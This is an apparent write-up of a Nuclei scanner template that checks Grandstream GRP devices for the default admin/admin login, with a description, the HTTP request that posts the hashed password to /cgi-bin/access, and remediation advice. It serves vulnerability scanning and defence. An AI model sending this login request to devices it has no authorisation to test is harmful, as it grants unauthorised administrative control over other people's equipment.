# Nuclei Template: Grandstream GRP - Default Login
**Template ID:** grandstream-grp-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`grandstream-grp-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Grandstream GRP series devices use default credentials (admin/admin). The web UI login sends a SHA-256 hash of the password to /cgi-bin/access. Successful authentication returns a JSON response with a session token, indicating full admin access to the device management interface.

## Steps to reproduce / Exploit Payload
```http
POST /cgi-bin/access HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Origin: {{RootURL}}
Referer: {{RootURL}}

access={{sha256("admin")}}
```

## Remediation
Change the default administrator password immediately. Update firmware to the latest version which generates random passwords on factory reset.

